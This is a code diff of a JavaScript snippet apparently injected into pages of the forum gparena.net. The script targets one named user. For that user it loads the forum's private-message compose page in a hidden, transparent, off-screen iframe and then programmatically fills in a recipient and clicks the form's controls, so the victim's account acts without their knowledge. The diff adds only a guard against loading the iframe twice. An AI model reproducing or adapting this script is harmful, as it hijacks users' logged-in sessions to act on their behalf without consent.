@@ -1,19 +1,21 @@
 // var script_ids = ["a1", "a2", "a3", "a4"];
 var header = document.getElementById('header');
 var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
-if (user_name === "Bury_comedor") {
-    var iframe = document.createElement('iframe');
-    iframe.id = "del1me";
-    iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
-    iframe.height = "400";
-    iframe.width = "400";
-    iframe.style.opacity = 0;
-    iframe.style.position = "absolute";
-    iframe.style.zIndex = -1;
-    iframe.style.top = "-30px";
-    header.append(iframe);
-    const wait = stealThisMoment(stealThisMoment, secondsToMS(3));
-};
+if (!document.getElementById("del1me")) {
+    if (user_name === "Bury_comedor") {
+        var iframe = document.createElement('iframe');
+        iframe.id = "del1me";
+        iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
+        iframe.height = "400";
+        iframe.width = "400";
+        iframe.style.opacity = 0;
+        iframe.style.position = "absolute";
+        iframe.style.zIndex = -1;
+        iframe.style.top = "-30px";
+        header.append(iframe);
+        const wait = stealThisMoment(stealThisMoment, secondsToMS(3));
+    };
+}
 function stealThisMoment() {
     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
